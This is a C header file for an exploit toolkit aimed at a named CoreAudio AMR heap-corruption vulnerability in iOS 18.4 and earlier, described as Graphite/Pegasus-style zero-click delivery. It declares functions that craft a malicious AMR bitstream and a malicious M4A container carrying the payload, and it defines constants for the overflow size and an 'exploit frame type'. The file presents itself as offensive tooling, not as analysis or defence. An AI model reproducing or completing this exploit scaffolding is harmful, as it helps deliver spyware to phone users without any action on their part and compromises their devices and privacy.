// amr_decoder.h - AMR Audio Decoder (CVE-2025-31200)
// Graphite/Pegasus-style audio-based zero-click delivery
// Target: iOS <= 18.4 (CoreAudio AMR heap corruption)

#ifndef AMR_DECODER_H
#define AMR_DECODER_H

#include <stdint.h>
#include <stddef.h>

#ifdef _WIN32
    #define AMR_EXPORT __declspec(dllexport)
#else
    #define AMR_EXPORT __attribute__((visibility("default")))
#endif

#ifdef __cplusplus
extern "C" {
#endif

#define AMR_MAX_PITCH_LAG 143
#define AMR_GLITCH_LAG 248
#define AMR_OVERFLOW_BYTES 210
#define AMR_VIOLATION_COUNT 189
#define AMR_EXPLOIT_FRAME_TYPE 7

typedef struct {
    int pitch_lag;
    double lsf[10];
    float sample_rate;
    int is_illegal;
} AMRFrame;

// Decode AMR bitstream (triggers CVE-2025-31200 on illegal pitch lag)
AMR_EXPORT int amr_decode(const int *bitstream, int bitstream_len, AMRFrame *out_frame);

// Check if pitch lag is illegal (> 143)
AMR_EXPORT int amr_is_illegal_pitch(int pitch_lag);

// Generate malicious AMR bitstream for zero-click delivery
AMR_EXPORT size_t amr_craft_malicious(int *out_bitstream, int max_len);

// Generate malicious M4A container with AMR payload
AMR_EXPORT size_t amr_craft_m4a(uint8_t *buffer, size_t buffer_size);

#ifdef __cplusplus
}
#endif

#endif
